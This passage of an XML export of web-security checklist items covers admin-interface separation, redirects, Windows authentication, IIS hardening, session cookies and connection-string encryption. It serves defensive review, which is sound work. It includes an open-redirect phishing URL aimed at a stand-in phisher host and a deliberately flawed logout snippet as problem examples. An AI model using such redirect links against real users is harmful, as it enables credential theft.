&lt;p&gt;Use the following steps to verify that the&amp;nbsp;account administration interface is separate from the main application interface:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that your application has a separate administrative interface. &lt;/strong&gt;
Review your application's design and verify that your application's design specifies separation of administrative and main application interfaces. Verify that your application passes the following checks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Administrative Functionality&lt;/strong&gt;: Verify that all administrative functionality is clearly identified and separated from the rest of your application's functionality. Exceptions are allowed only when your application allows users to modify their
 own accounts. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Code Organization&lt;/strong&gt;: Ensure all administrative functionality is structured as a single module and not scattered throughout your application.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Code Inheritance&lt;/strong&gt;: Verify that all Java classes that handle your application's administrative tasks are declared as final. Example:
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;public final class myappAcctAdmin&lt;br&gt;{&lt;br&gt; ...&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Hosting Container&lt;/strong&gt;: Verify that all administrative functionality operates within a Java container or a JVM that is separate from the rest of your application. Depending on the application server that your application uses, it might be necessary
 to run multiple instances of the application server. Additionally, check if your administrative interface operates on a different port than the rest of your application (e.g. port 3128).&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that the administrative interface is secure. &lt;/strong&gt;Use the following steps to examine the security of your application's administrative interface:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Security Policy&lt;/strong&gt;: Ensure that your application has a security policy regarding its administrative interface.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Separate Authentication&lt;/strong&gt;: Verify that privileged users are forced to re-authenticate before accessing the administrative interface. Check if your application's administrative interface uses a separate authentication module&amp;nbsp;from the rest
 of your application. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Access Controls&lt;/strong&gt;: Using the &lt;a href="?#ruledisplay:C9F50A0D-15D4-4E10-AACA-D374F24974D2"&gt;
Test Accounts are Removed&lt;/a&gt; checklist, verify that only valid, privileged users can access your application's administrative interface.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Connection&lt;/strong&gt;: Depending on your application's requirements, it may be necessary to check if your application's administrative interface is utilizing SSL. Use the
&lt;a href="?#ruledisplay:AFC86927-1116-4207-B604-55FE690C298B"&gt;Communication Links are Encrypted&lt;/a&gt; checklist to ensure your application's proper use of SSL.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows the navigation bar for an administrative account of the application. Because the administrative code is not separated from the application, an administrator can use a single session to use and administer the application. Therefore,
 a vulnerability such as cross-site scripting in the main application interface will expose the administrative interface as well.&lt;/p&gt;
&lt;pre&gt;&amp;lt;td valign=top width=150 bgcolor=&amp;quot;#e5e5e5&amp;quot;&amp;gt;&lt;br&gt;  &amp;lt;b&amp;gt;::rates&amp;lt;/b&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/analyzeRates.do?action=browse&amp;quot;&amp;gt;browse rates&amp;lt;/a&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/manageRates.do?action=add&amp;quot;&amp;gt;add rates&amp;lt;/a&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/manageRates.do?action=import&amp;quot;&amp;gt;import rates&amp;lt;/a&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/manageRates.do?action=export&amp;quot;&amp;gt;export rates&amp;lt;/a&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;  &amp;lt;p&amp;gt;&amp;lt;b&amp;gt;::acct management&amp;lt;/b&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/manageUsers.do?action=add&amp;quot;&amp;gt;add user&amp;lt;/a&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/manageUsers.do&amp;quot;&amp;gt;manage users&amp;lt;/a&amp;gt;&lt;br&gt;  &amp;lt;br&amp;gt;  &amp;lt;p&amp;gt;&amp;lt;a href=&amp;quot;http://serv02.example.com/logout.do&amp;quot;&amp;gt;log out&amp;lt;/a&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:31529619-FB94-4798-BB29-14AC389F2240"&gt;Guideline: Separate Account Administration from the Main Application Interface (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>75e23234-37ea-4c3d-97ba-8a44c6cf8060</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Redirects and forwards are not used unless necessary</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Verify that redirects and forwards are not used unless necessary.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Redirects or forwards may be manipulated by an attacker to create hyperlinks that appear to point to legitimate sites, but actually point to attacker-controlled malicious pages. This technique is oftened used by phishers to trick people into trusting a fake
 web site.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to verify that redirects and forwards are not used unless necessary:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Review application design.&lt;/strong&gt; Look through project documentation for any mentions of redirects or forwards (also known as transfers in .NET). Ideally, there should be no redirects or forwards in the application design.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Review code.&lt;/strong&gt; Search code for redirects or forwards. Because there are many different ways to implement redirects and forwards, look through every page for code that handles parameters, and verify that this code doesn't perform redirects
 or forwards based on input.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Perform the following actions to avoid using redirects or forwards:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate redirects and forwards.&lt;/strong&gt; Review application code to find all redirects and forwards used by the application.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Review application design.&lt;/strong&gt; Determine how redirects and forwards figure into the application design. Consider making design changes to remove the need for redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Remove redirects or forwards.&lt;/strong&gt; Remove the redirects and forwards that are not necessary after changes to the application design.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Secure the remaining redirects or forwards.&lt;/strong&gt; If there appears to be no reasonable way to get rid of redirects or forwards, use related guidelines to secure the remaining redirects or forwards.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider an on-line banking application that has an insecure redirect:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=[destination]&lt;/pre&gt;
&lt;p&gt;A phisher may create the following hyperlink to point to his own site and send it in spam messages to millions of people:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=www.phisher.com&lt;/pre&gt;
&lt;p&gt;When a user sees a link that appears to point to his bank at onlinebank.com in an e-mail message, he clicks that link and sees a web site that looks exactly like the bank's, but is actually a phishing web site used to steal authentication credentials. The
 user enters his account number and PIN into the web page, receives an error message telling him to try again, and is redirected to the bank's real site. After entering his credentials again, the user successfuly views his account. However, the phisher now
 has the user's online banking information.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The best solution to unvalidated redirects or forwards is to not use redirects or forwards at all. Considering the problem example above, a simple solution would be to remove the redirect.asp page after making the necessary changes to the application design.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8"&gt;Don't Use Redirects or Forwards if Possible&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:f53c44e4-a08e-437c-a40d-ec3db00baca7"&gt;Calculate Destinations of Redirects and Forwards Without User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:83896e9e-a4cd-434c-980a-276c660984da"&gt;Use Mapping Values When Redirecting on User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>779b4344-83ee-4268-8aea-54dcd613b59b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Windows Authentication is used Where Possible</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;If your user's accounts are in Active Directory,&amp;nbsp;verify that&amp;nbsp;your application is using Windows Authentication.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By using Windows authentication with Active Directory, you benefit from a unified identity store, centralized account administration, enforceable account and password policies and strong authentication that avoids sending plain-text passwords over the network.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check if your application is using Windows Authentication:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;div&gt;Check if your user accounts are stored in Active Directory.&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Ensure that IIS is set to disable anonymous access.&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Ensure that IIS is configured to use Windows-based authentication for your web application's virtual directory.&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Ensure&amp;nbsp;that the &lt;strong&gt;mode&lt;/strong&gt; attribute on the &amp;lt;&lt;strong&gt;authentication&lt;/strong&gt;&amp;gt; element is set to &amp;quot;Windows&amp;quot; (the default setting) in your Web.config file.&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To use Windows authentication in ASP.NET, you must use Microsoft Internet Information Services (IIS) to disable anonymous access and configure a Windows-based authentication method for your Web application's virtual directory. You are generally recommended
 to use Windows integrated authentication, but you can also use Basic, Digest, or client certificate authentication. You must also ensure that the
&lt;strong&gt;mode&lt;/strong&gt; attribute on the &amp;lt;&lt;strong&gt;authentication&lt;/strong&gt;&amp;gt; element is set to &amp;quot;Windows&amp;quot; (the default setting) in your Web.config file.
&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:4888ef0b-253e-4b1f-9f19-59bbc4cb5fdd"&gt;Guideline: Choose Windows Authentication When You Can&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7920abf3-d333-4831-bf39-5713210badb6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>IIS log files are relocated and secured.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that IIS log files are&amp;nbsp;secured by renaming and relocating the files.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;By moving and renaming the IIS log files, you make it much more difficult for an attacker to cover his tracks. The attacker must locate the log files before he or she can alter them. To make an attacker's task more difficult still, use NTFS permissions to
 secure the log files.&lt;/p&gt;
&lt;p&gt;Move and rename the IIS log file directory to a different volume than your Web site. Do not use the system volume. Then, apply the following NTFS permissions to the log files folder and subfolders.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Administrators: Full Control &lt;/li&gt;&lt;li&gt;System: Full Control &lt;/li&gt;&lt;li&gt;Backup Operators: Read &lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7adb2cdc-5e51-4510-a5a7-f911e17d7de7</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Potentially dangerous virtual directories, including IISSamples, IISAdmin, IISHelp, and Scripts virtual directories, are removed.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that sample applications are not installed by default on production Web servers. Applications&amp;nbsp;include potentially dangerous virtual directories, IISSamples, IISAdmin, IISHelp, and Scripts virtual directories.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Sample applications are not installed by default and should not be installed on production Web servers. Remove all sample applications, including the ones that can be accessed only from the local computer with http://localhost, or http://127.0.0.1. Remove
 the following virtual directories from production servers: IISSamples, IISAdmin, IISHelp, and Scripts.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note: &lt;/strong&gt;IISLockdown provides an option to remove the Scripts, IISSamples, IISAdmin, and IISHelp virtual directories&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7b83d4f9-0464-4c80-ad68-8f569842f5fe</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Code access security is enabled on the server.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that code access security is enabled on the server by determining the settings in Security.config file.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Machine level code access security policy is determined by settings in the Security.config file located in the following directory: %windir%\Microsoft.NET\Framework\{version}\CONFIG&lt;/p&gt;
&lt;p&gt;Run the following command to be sure that code access security is enabled on your server:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;caspol -s On&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about configuring code access security for ASP.NET Web applications, see Chapter 9, &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302425.aspx"&gt;Using Code Access Security with ASP.NET&lt;/a&gt;.&amp;quot;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7d576466-a454-4cc1-838b-06e1359f53f8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Session Cookies are Protected</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Session Management</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that the confidentiality of session cookies is protected.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Session cookies are used by an application to identify the session associated with a particular user. Protecting session cookies can help prevent an attacker from hijacking the session and using the application posing as a legitimate user.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to verify that your application's session cookies are handled securely:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that session identifiers cannot be guessed. &lt;/strong&gt;Ensure that your application's session identifiers cannot be guessed by an attacker. Verify that your application's session IDs meet the following requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Length&lt;/strong&gt;: Your application uses long session identifiers (e.g. string of length 32).
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Triviality&lt;/strong&gt;: Your application uses randomly generated session identifiers.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Lifetime&lt;/strong&gt;: Your application uses &lt;strong&gt;HttpSession.setMaxInactiveInterval&lt;/strong&gt; to expire inactive sessions.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Recycling&lt;/strong&gt;: Your application does not reuse previously used sessions.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that users can invalidate their own sessions. &lt;/strong&gt;Ensure that your application uses
&lt;strong&gt;HttpSession.invalidate&lt;/strong&gt; to allow its users to invalidate their own sessions.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that session cookies are sent over encrypted channels. &lt;/strong&gt;
Ensure your application transmits session cookies over encrypted channels. Although this is not required for non-sensitive transactions, it is mandatory for any transactions are sensitive in nature.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows the logout function of the &lt;strong&gt;LoginModule&lt;/strong&gt; used when relying on JAAS for authentication. The code removes all authentication tokens associated with the current session but fails to invalidate the session.
&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean logout() throws LoginException&lt;br&gt;{&lt;br&gt;      subject.getPrincipals().remove(userToken);&lt;br&gt;      succeeded = false;&lt;br&gt;      commitSucceeded = false;&lt;br&gt;      clearCredentials();&lt;br&gt;      userToken = null;&lt;br&gt;       // The application should have invalidated the session here.&lt;br&gt;       // Log the logout event. Consult the Logging section for more details&lt;br&gt;      return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about session prediction attacks, see: &lt;a href="http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml"&gt;
Credential and Session Prediction&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:F0E2BFFC-E6D1-4DC6-A6C2-D078F54AE10E"&gt;Guideline: Protect Session Cookies (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>8029ca0c-2bc3-436f-a288-5b10cc2bb80a</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>RSA-protected Configuration Provider is used to Protect Connection Strings in a Web Farm Environment</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that your application uses RSA Protected Configuration provider to&amp;nbsp;protect connection strings in a Web farm environment.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To protect credentials in configuration files, encrypt them. Place your database connection strings inside the &amp;lt;&lt;strong&gt;connectionStrings&lt;/strong&gt;&amp;gt; element of the Web.config file and then encrypt that element by using the Aspnet_regiis utility. You can use
 DPAPI or RSA encryption. Use RSA in Web farms because you can easily export and import RSA keys across servers. Protecting connection strings is particularly important for connection strings that use SQL authentication because they contain clear text user
 IDs and passwords.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;You should also encrypt connection strings if you use Windows authentication. Although this form of connection string does not contain credentials, you should aim to keep server and database names private.
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>81d3f64a-9741-43a0-948e-69b42be00efc</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Failed logon attempts are audited.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that failed logon attempts are audited to detect and trace suspicious behavior.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;You must log failed logon attempts to be able to detect and trace suspicious behavior.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To audit failed logon attempts&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start the Local Security Policy tool from the Administrative Tools program group.
&lt;/li&gt;&lt;li&gt;Expand &lt;strong&gt;Local Policies&lt;/strong&gt; and then select &lt;strong&gt;Audit Policy&lt;/strong&gt;
&lt;/li&gt;&lt;li&gt;Double-click &lt;strong&gt;Audit account logon events&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Failure&lt;/strong&gt; and then &lt;strong&gt;OK&lt;/strong&gt;. &lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Logon failures are recorded as events in the Windows security event log. The following event IDs are suspicious:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;531&lt;/strong&gt;. This means an attempt was made to log on using a disabled account.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;529&lt;/strong&gt;. This means an attempt was made to log on using an unknown user account or using a valid user account but with an invalid password. An unexpected increase in the number of these audit events might indicate an attempt to guess passwords.
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>88e8e948-8b42-49f3-a36b-bb545ffda199</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Mapping values are used for redirects and forwards</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Verify that mapping values are used to determine destinations of redirects and forwards.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using mapping values when performing redirects or forwards prevents malicious users from creating hyperlinks that use the redirects or forwards to point to pages other than those intended by the application design.&lt;/p&gt;
